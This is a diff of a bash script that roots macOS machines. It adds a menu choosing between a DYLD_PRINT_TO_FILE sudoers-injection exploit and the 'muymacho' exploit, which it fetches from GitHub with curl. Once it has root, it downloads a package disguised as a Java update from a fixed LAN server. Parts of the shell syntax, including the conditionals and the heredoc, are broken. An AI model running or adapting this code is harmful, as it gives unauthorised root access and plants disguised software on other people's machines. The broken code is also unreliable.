@@ -24,12 +24,35 @@ echo;echo
 function KeepSafe {
 echo -e '\033[1mExploiting machine...\033[0m'
 echo
-
-#--- EPLOIT THE MACHINE WITH ROOTPIPE ---#
-echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo bash <<'BASHINJECT'
+#--- DEFINE VARIABLES ---#
 randomTMP=/tmp$$/
 serverAddress=192.168.2.175:5980/Java_8_Update_60.pkg
 curledFile=/tmp$$/Java_8_Update_60.pkg
+
+#--- MAKE A TEMPORARY DIRECTORY WITH UNIQUE PID ---#
+    sudo mkdir -v $randomTMP
+
+    echo;echo
+#--- PREFETCH MACHO ---#
+curl https://raw.githubusercontent.com/luismiras/muymacho/master/muymacho.py > /$randomTMP/macho.py
+#--- EPLOIT THE MACHINE ---#
+function rocket { echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo bash <<'BASHINJECT' }
+function macho {
+cd /$randomTMP
+python macho.py /$randomTMP }
+echo "rocket or macho?"
+read answer
+  if [ $answer = rocket];
+    then
+      rocket
+    else
+  fi
+
+  if [ $answer = macho ];
+    then
+      macho
+    else
+  fi
 
 #--- CHECK FOR ROOT ---#
   if [[ $EUID -ne 0 ]]
@@ -37,11 +60,7 @@ curledFile=/tmp$$/Java_8_Update_60.pkg
     echo -e "\033[1mFailed! No root!\033[0m"
     exit 1
   else
-#--- MAKE A TEMPORARY DIRECTORY WITH UNIQUE PID ---#
-    sudo mkdir -v $randomTMP
-
-    echo;echo
-
+  fi
 #--- DOWNLOAD THE PACKAGE ---#
     echo -e "\033[1mcURLing Java_8_Update_60.pkg...\033[0m"
     sudo curl $serverAddress -o $curledFile
